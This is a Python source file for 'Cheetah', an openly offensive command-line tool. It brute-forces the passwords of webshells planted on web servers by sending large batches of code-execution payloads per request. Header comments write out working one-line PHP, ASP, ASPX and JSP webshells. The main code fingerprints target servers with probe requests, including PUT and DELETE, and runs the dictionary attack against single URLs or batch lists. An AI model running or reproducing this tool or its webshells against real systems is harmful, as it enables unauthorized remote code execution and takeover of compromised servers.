#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Cheetah is a dictionary-based webshell password violent cracker

that runs like a cheetah hunt for prey as swift and violent.

Cheetah's working principle is that it can submit a large number
of detection passwords based on different web services at once,
blasting efficiency is thousands of times other common webshell
password violent crack tools.
"""

# payload format
# php:  =>  <?php @eval($_GET['sunnyelf']);?> or <?php @eval($_POST['sunnyelf']);?>
# http://localhost/shell_get.php?pwd=$s=pwd;print($s);&sunnyelf=$s=sunnyelf;print($s);
# asp:  =>  <%eval request("sunnyelf")%>
# http://localhost/shell.asp?pwd=response.write("pwd")&sunnyelf=response.write("sunnyelf")
# aspx:  =>  <%@ Page Language="Jscript"%><%eval(Request.Item["sunnyelf"]);%>
# http://localhost/shell.aspx?pwd=Response.Write("pwd");&sunnyelf=Response.Write("sunnyelf")
# jsp:  =>  <%Runtime.getRuntime().exec(request.getParameter("sunnyelf"));%>
# http://localhost/shell.jsp?pwd=System.out.println("pwd");&sunnyelf=System.out.println("sunnyelf");

import os
import re
import sys
import time
import signal
import string
import random
import requests
import argparse

__program__ = 'cheetah'
__version__ = '1.0.0'
__license__ = 'GNU GPLv3'
__author__ = 'sunnyelf[@hackfun.org]'
__github__ = 'https://github.com/sunnyelf/cheetah'

red = '\033[1;31m'
green = '\033[1;32m'
yellow = '\033[1;33m'
white = '\033[1;37m'
reset = '\033[0m'


def set_coding():
    if sys.version_info.major == 2:
        if sys.getdefaultencoding() is not 'utf-8':
            reload(sys)
            sys.setdefaultencoding('utf-8')


def print_highlight(message):
    times = get_time()
    msg_level = {'INFO': green, 'HINT': white, 'WARN': yellow, 'ERROR': red}
    for level, color in msg_level.items():
        if level in message:
            print(color+times+message+reset)
            return
    print(white+times+message+reset)
    return


def get_time():
    return '[' + time.strftime("%H:%M:%S", time.localtime()) + '] '


def exit_cheetah(signum, frame):
    print_highlight('[HINT] you pressed the Ctrl + C key to terminate cheetah')
    print_highlight('[INFO] the cheetah end execution')
    exit(signum)


def print_info():
    print('program: ' + __program__)
    print('version: ' + __version__)
    print('license: ' + __license__)
    print('author: ' + __author__)
    print('github: ' + __github__)
    print('')
    print('description: ' + __doc__)


def print_banner():
    banner = r"""
_________________________________________________
       ______              _____         ______
__________  /_ _____ _____ __  /_______ ____  /_
_  ___/__  __ \_  _ \_  _ \_  __/_  __ \ __  __ \
/ /__  _  / / //  __//  __// /_  / /_/ / _  / / /
\___/  / / /_/ \___/ \___/ \__/  \____/  / / /_/
      /_/                               /_/

a very fast brute force webshell password tool.
    """
    print(white+banner+reset)


def read_chunks(pwd_file):
    with open(pwd_file) as pwd_file:
        while 1:
            chunk_data = pwd_file.read(100 * 1024 * 1024)
            if not chunk_data:
                break
            yield chunk_data


def process_pwd_file(options):
    for i in range(len(options.pwd_file_list)):
        file_name = options.pwd_file_list[i]
        print_highlight('[INFO] removing duplicate rows in '+file_name)
        time_str = str(time.strftime("%y-%m-%d(%H,%M,%S)_", time.localtime()))
        new_file_name = 'data/solved_at_' + time_str + os.path.basename(file_name)
        with open(new_file_name, 'a') as new_file:
            for chunk in read_chunks(file_name):
                new_file.write('\n'.join(set(chunk.split())).lower())
            options.pwd_file_list[i] = new_file_name
    print_highlight('[HINT] duplicate rows have been removed')
    return


def gen_random_header(options):
    if options.verbose:
        print_highlight('[INFO] generating a random request header')
    with open('data/user-agent.list') as agent_file:
        agent_list = agent_file.readlines()
    random_agent = random.choice(agent_list).replace('\n', '')
    reg = '[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(\.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+'
    header = {'Host': re.search(reg, options.url).group(0),
              'User-Agent': random_agent,
              'Accept': '*/*',
              'Accept-Encoding': '*',
              'Accept-Language': '*',
              'Cache-Control': 'no-cache',
              'Connection': 'keep-alive'}
    return header


def req_get(payload, times, options):
    header = gen_random_header(options)
    if options.time != 0:
        print_highlight('[HINT] sleeping '+str(options.time)+' seconds to request')
        time.sleep(options.time)
    if options.verbose:
        print_highlight('[INFO] getting '+str(times)+'th group payload to '+options.url)
        print_highlight('[HINT] waiting for web server response')

    try:
        r = requests.get(url=options.url,
                         headers=header,
                         params=payload,
                         timeout=10)
    except Exception as e:
        print_highlight(e.message)
        return 'error'

    error_msg = '[ERROR] '+options.url+' response code: '+str(r.status_code)
    if r.status_code == 404:
        print_highlight(error_msg)
        print_highlight('[WARN] maybe the request url incorrect')
        print_highlight('[HINT] try to check the url '+options.url)
        return 'error'

    code = [413, 414, 500]
    if r.status_code in code:
        print_highlight(error_msg)
        print_highlight('[WARN] request url too long when request '+options.url)
        print_highlight('[HINT] try to specify a smaller value of parameter -n')
        return 'error'

    if r.status_code in range(200, 300):
        pwd_hint = '[HINT] password of '+options.url
        print_highlight('[INFO] web server responds successfully')
        if r.text in payload:
            print(white+get_time()+pwd_hint+' is '+reset+red+r.text+reset)
            with open('data/find.list', 'a') as find_file:
                find_file.write(options.url+'\t\t'+r.text+'\n')
            print_highlight('[HINT] password has been written to data/find.list file')
            return 'find'
        else:
            if options.verbose:
                print_highlight(pwd_hint+' not in '+str(times)+' th group payload')
            return 'notfind'
    else:
        print_highlight(error_msg)
        return 'error'


def req_post(payload, times, options):
    header = gen_random_header(options)
    if options.time != 0:
        print_highlight('[HINT] sleeping '+str(options.time)+' seconds to request')
        time.sleep(options.time)
    if options.verbose:
        print_highlight('[INFO] posting '+str(times)+'th group payload to '+options.url)
        print_highlight('[HINT] waiting for web server response')
    try:
        r = requests.post(url=options.url,
                          headers=header,
                          data=payload,
                          timeout=10)
    except Exception as e:
        print_highlight('[ERROR] '+str(e))
        return 'error'

    error_msg = '[ERROR] '+options.url+' response code: '+str(r.status_code)
    if r.status_code == 404:
        print_highlight(error_msg)
        print_highlight('[WARN] maybe the request url incorrect')
        print_highlight('[HINT] try to check the url '+options.url)
        return 'error'

    code = [413, 414, 500]
    if r.status_code in code:
        print_highlight(error_msg)
        print_highlight('[WARN] request url too long when request '+options.url)
        print_highlight('[HINT] try to specify a smaller value of parameter -n')
        return 'error'

    if r.status_code in range(200, 300):
        pwd_hint = '[HINT] the password of ' + options.url
        if options.verbose:
            print_highlight('[INFO] web server responds successfully')
        if r.text in payload:
            print(white+get_time()+pwd_hint+' is '+reset+red+r.text+reset)
            with open('data/find.list', 'a') as find_file:
                find_file.write(options.url+'\t\t'+r.text+'\n')
            print_highlight('[HINT] password has been written to data/find.list')
            return 'find'
        else:
            if options.verbose:
                print_highlight(pwd_hint+' not in '+str(times)+' th group payload')
            return 'notfind'
    else:
        print_highlight(error_msg)
        return 'error'


def detect_web(options):
    print_highlight('[WARN] not specify the web server or shell type')
    print_highlight('[INFO] detecting server info of '+options.url)
    server_list = ['apache', 'nginx', 'iis']
    shell_list = ['php', 'aspx', 'asp', 'jsp']
    header = gen_random_header(options)
    web_hint = '[HINT] web server may be '
    shell_hint = '[HINT] the shell type may be '
    if options.shell == 'detect':
        for shell in shell_list:
            if shell in options.url.lower():
                print_highlight(shell_hint+shell)
                options.shell = shell
                break

    if options.server == 'detect' or options.shell == 'detect':
        try:
            get_rsp = requests.get(url=options.url, headers=header)
        except Exception as e:
            print_highlight('[ERROR] '+str(e))
            return 'error'

        if 'server' in get_rsp.headers:
            print_highlight(web_hint+get_rsp.headers['server'])
            options.server = get_rsp.headers['server'].lower()

        if 'x-powered-by' in get_rsp.headers:
            power_hint = '[HINT] web server may be x-powered-by '
            print_highlight(power_hint+get_rsp.headers['x-powered-by'])
            if options.shell == 'detect':
                for shell in shell_list:
                    if shell in get_rsp.headers['x-powered-by'].lower():
                        print_highlight(shell_hint+shell)
                        options.shell = shell
                        break
            if options.server == 'detect':
                for server in server_list:
                    if server in get_rsp.headers['x-powered-by'].lower():
                        print_highlight(web_hint+server)
                        options.server = server
                        break

    if options.server == 'detect':
        random_str = str(random.sample(string.printable, 5)).encode('hex')
        reg = 'http(s)?:\/\/[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(\.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+'
        random_url = re.search(reg, options.url).group(0) + random_str
        random_rsp = requests.get(url=random_url, headers=header)
        if random_rsp.status_code == 404:
            for server in server_list:
                if server in str(random_rsp.text).lower():
                    print_highlight(web_hint+server)
                    options.server = server
                    break

    if options.server == 'detect':
        put_rsp = requests.put(url=options.url, headers=header)
        if put_rsp.status_code == 405 or put_rsp.status_code == 411:
            options.server = 'nginx'
            print_highlight(web_hint+options.server)
        if put_rsp.status_code == 200:
            options.server = 'apache'
            print_highlight(web_hint+options.server)

    if options.server == 'detect':
        del_rsp = requests.delete(url=options.url, headers=header)
        if del_rsp.status_code == 501:
            options.server = 'iis'
            print_highlight(web_hint+options.server)
        if del_rsp.status_code == 403:
            options.server = 'apache'
            print_highlight(web_hint+options.server)


def set_max_req(options):
    if options.max_request is None:
        print_highlight('[WARN] you did not specify the maximum request parameter')
        server_dict = {'apache': {'post': 1000, 'get': 100},
                       'nginx': {'post': 1000, 'get': 756},
                       'iis': {'post': 4000, 'get': 45}}
        for server in server_dict:
            if server in options.server:
                print_highlight('[INFO] setting the number of request parameters '
                                + str(server_dict[server][options.req_type]))
                options.max_request = server_dict[server][options.req_type]
                break

    if options.max_request is None:
        if options.req_type == 'post':
            print_highlight('[INFO] the web server '+options.server+' '+options.req_type+' default setting 10000')
            options.max_request = 1000
        if options.req_type == 'get':
            print_highlight('[INFO] the web server '+options.server+' '+options.req_type+' default setting 100')
            options.max_request = 100


def dict_attack(options):
    if options.server == 'detect' or options.shell == 'detect':
        if detect_web(options) == 'error':
            return 'error'
    set_max_req(options)
    pwd_file_find = ''
    for pwd_file_name in options.pwd_file_list:
        print_highlight('[INFO] opening password file '+pwd_file_name)
        try:
            pwd_file = open(pwd_file_name)
        except Exception as e:
            print_highlight('[ERROR]'+str(e))
            print_highlight('[INFO] the cheetah end execution')
            exit(1)
        print_highlight('[HINT] using password file '+pwd_file_name)

        print_highlight('[INFO] cracking password of '+options.url)
        payload = dict()
        times = 1
        pwd_find = ''
        for pwd in pwd_file:
            pwd = pwd.replace('\n', '')
            if options.shell == 'php':
                payload[pwd] = '$s='+pwd+';print($s);'
            if options.shell == 'asp':
                payload[pwd] = 'response.write("'+pwd+'")'
            if options.shell == 'aspx':
                payload[pwd] = 'Response.Write("'+pwd+'");'
            if options.shell == 'jsp':
                payload[pwd] = 'System.out.println("'+pwd+'");'

            if len(payload) == options.max_request:
                if options.req_type == 'post':
                    res = req_post(payload, times, options)
                    if res == 'find':
                        pwd_find = 'find'
                        break
                    if res == 'error':
                        pwd_find = 'error'
                        break

                if options.req_type == 'get':
                    res = req_get(payload, times, options)
                    if res == 'find':
                        pwd_find = 'find'
                        break
                    if res == 'error':
                        pwd_find = 'error'
                        break
                payload.clear()
                times += 1

        if len(payload) < options.max_request:
            if options.req_type == 'post':
                res = req_post(payload, times, options)
                if res == 'find':
                    pwd_file_find = 'find'
                    break
                if res == 'error':
                    pwd_file_find = 'error'
                    break
            if options.req_type == 'get':
                res = req_get(payload, times, options)
                if res == 'find':
                    pwd_file_find = 'find'
                    break
                if res == 'error':
                    pwd_file_find = 'error'
                    break
        pwd_file.close()

        if pwd_find == 'find':
            pwd_file_find = 'find'
            break
        if pwd_find == 'error':
            pwd_file_find = 'error'
            break

    if pwd_file_find == 'find':
        return 'find'
    if pwd_file_find == 'error':
        return 'error'

    print_highlight('[WARN] the cheetah did not find the webshell password')
    print_highlight('[HINT] try to change a better password dictionary file')
    print_highlight('[HINT] try to specify a smaller value of parameter -n')
    if options.req_type == 'post':
        print_highlight('[HINT] try to specify parameter -r for GET request')
    if options.req_type == 'get':
        print_highlight('[HINT] try to specify parameter -r for POST request')


def main():
    set_coding()
    print_banner()

    if len(sys.argv) == 1:
        print('[*] try to use -h or --help show help message')
        exit(1)

    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog='''\
use examples:
  python cheetah.py -u http://orz/orz.php
  python cheetah.py -u http://orz/orz.jsp -r post -n 1000 -v
  python cheetah.py -u http://orz/orz.asp -r get -c -p data/pwd.list
  python cheetah.py -u http://orz/orz -w aspx -s iis -n 1000
  python cheetah.py -b url.list -c -p pwd1.list pwd2.list -v''')
    parser.add_argument('-i', '--info', action='store_true', dest='info',
                        help='show information of cheetah and exit')
    parser.add_argument('-v', '--verbose', action='store_true', dest='verbose',
                        help='enable verbose output(default disabled)')
    parser.add_argument('-c', '--clear', action='store_true', dest='remove',
                        help='clear duplicate password(default disabled)')
    parser.add_argument('-up', '--update', action='store_true', dest='update',
                        help='update cheetah')
    parser.add_argument('-r', '--request', default='post', dest='req_type',
                        choices=['GET', 'get', 'POST', 'post'], metavar='',
                        help="specify request method(default POST)")
    parser.add_argument('-t', '--time', type=float, default=0,
                        dest='time', metavar='',
                        help='specify request interval seconds(default 0)')
    parser.add_argument('-w', '--webshell', default='detect', metavar='',
                        choices=['php', 'asp', 'aspx', 'jsp'],
                        help="specify webshell type(default auto-detect)",
                        dest='shell')
    parser.add_argument('-s', '--server', default='detect',
                        dest='server', metavar='',
                        choices=['apache', 'nginx', 'iis'],
                        help="specify web server name(default auto-detect)")
    parser.add_argument('-n', '--number', type=int,
                        dest='max_request', metavar='',
                        help='specify the number of request parameters')
    parser.add_argument('-u', '--url', metavar='', dest='url',
                        help='specify the webshell url')
    parser.add_argument('-b', '--url-file', dest='url_file', metavar='',
                        help='specify batch webshell urls file')
    parser.add_argument('-p', nargs='+', default='data/pwd.list',
                        dest='pwd_file_list', metavar='FILE',
                        help='specify password file(default pwd.list)')
    options = parser.parse_args()

    if options.update:
        abs_dir = os.path.dirname(os.path.abspath(__file__))
        if os.path.exists(os.path.join(abs_dir, '.git')):
            print('[*] hint: use "git pull origin master" update cheetah')
            exit(0)
        if not os.path.isfile(os.path.join(abs_dir, 'update.py')):
            print('[!] error: can not find file update.py')
            print('[*] hint: use "git clone '+__github__+'.git" to update')
            print('[*] hint: open link '+__github__+' with browser to download')
            exit(0)
        else:
            print('[*] hint: try to use "python update.py" to update cheetah')
            exit(0)

    if options.info:
        print_info()
        exit(0)

    if options.url is None and options.url_file is None:
        print('[!] error: the argument -u or -uf is required')
        exit(1)

    if isinstance(options.pwd_file_list, str):
        options.pwd_file_list = [options.pwd_file_list]

    options.req_type = options.req_type.lower()
    options.server = options.server.lower()

    print_highlight('[INFO] the cheetah start execution')
    signal.signal(signal.SIGINT, exit_cheetah)
    if options.verbose:
        print_highlight('[INFO] using verbose mode')
    if options.remove:
        process_pwd_file(options)
    if options.req_type == 'post':
        print_highlight('[HINT] using POST request mode')
    if options.req_type == 'get':
        print_highlight('[HINT] using GET request mode')
    if options.time < 0 or options.time > 3600:
        print_highlight('[ERROR] invalid request interval time '+str(options.time))
        print_highlight('[HINT] valid request interval seconds is 0 ~ 3600')
        print_highlight('[INFO] the cheetah end execution')
        exit(1)
    print_highlight('[HINT] setting request interval seconds '+str(options.time))
    if options.url is not None:
        print_highlight('[HINT] using dictionary-based password attack')
        print_highlight('[INFO] cracking password of '+options.url)
        attack_res = dict_attack(options)
        if attack_res == 'find' or attack_res == 'error':
            pass
    if options.url_file is not None:
        print_highlight('[HINT] using batch cracking mode')
        print_highlight('[INFO] opening urls file '+options.url_file)
        with open(options.url_file) as url_file:
            print_highlight('[INFO] using urls file '+options.url_file)
            print_highlight('[HINT] using dictionary-based password attack')
            for url_line in url_file:
                options.url = url_line.replace('\n', '')
                attack_res = dict_attack(options)
                if attack_res == 'find' or attack_res == 'error':
                    continue

    print_highlight('[INFO] the cheetah end execution')


if __name__ == '__main__':
    main()
